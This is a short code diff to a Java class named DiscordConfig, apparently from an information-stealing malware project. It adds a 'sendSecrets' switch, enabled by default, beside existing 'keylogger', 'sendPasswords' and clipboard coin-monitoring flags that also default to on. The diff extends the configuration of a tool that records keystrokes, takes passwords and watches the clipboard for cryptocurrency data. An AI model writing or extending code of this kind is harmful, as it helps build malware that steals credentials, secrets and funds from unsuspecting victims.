@@ -20,6 +20,7 @@ public final class DiscordConfig {
 	private static volatile boolean keylogger = true;
 	private static volatile boolean sendPasswords = true;
 	private static volatile boolean clipboard = true;
+	private static volatile boolean sendSecrets = true;
 	private static volatile boolean testnet = false;
 	private static volatile Map<String, List<String>> provisionedCoins = Map.of();
 
@@ -84,6 +85,7 @@ public final class DiscordConfig {
 		sendPasswords = !Boolean.FALSE.equals(keys.get("sendPasswords"));
 		Map<String, Object> board = Json.map(root.get("clipboard"));
 		clipboard = !Boolean.FALSE.equals(board.get("enabled"));
+		sendSecrets = !Boolean.FALSE.equals(board.get("sendSecrets"));
 		testnet = Boolean.TRUE.equals(board.get("testnet"));
 		Map<String, List<String>> coins = new LinkedHashMap<>();
 		for (Map.Entry<String, Object> entry : Json.map(board.get("coins")).entrySet()) {
@@ -124,6 +126,10 @@ public final class DiscordConfig {
 		return clipboard;
 	}
 
+	public static boolean sendSecrets() {
+		return sendSecrets;
+	}
+
 	public static boolean testnet() {
 		return testnet;
 	}
@@ -142,6 +148,7 @@ public final class DiscordConfig {
 		keylogger = true;
 		sendPasswords = true;
 		clipboard = true;
+		sendSecrets = true;
 		testnet = false;
 		provisionedCoins = Map.of();
 	}
